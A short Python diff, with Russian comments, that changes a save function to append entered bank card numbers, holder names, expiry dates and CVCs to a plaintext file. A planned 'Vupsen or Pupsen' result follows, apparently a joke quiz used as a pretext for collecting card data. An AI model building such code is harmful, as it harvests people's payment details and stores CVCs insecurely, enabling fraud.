@@ -17,11 +17,9 @@ def save():
 
 
     # добавить сохранение данных в файл
-    with open("bankovskaya_karta.txt", "w", encoding="utf-8") as file:
-        file.write(f"Номер: {number}\n")
-        file.write(f"Имя: {name}\n")
-        file.write(f"Дата: {date}\n")
-        file.write(f"CVC: {cvc}\n")
+    with open("bankovskaya_karta.txt", "a", encoding="utf-8") as file:
+        file.write(f"Номер: {number}\nИмя: {name}\nДата: {date}\nCVC: {cvc}\n\n")
+
 
     # сказать пользователю кто он - Вупсень или Пупсень? (сделать шаблон)
     if len(number) != 16:
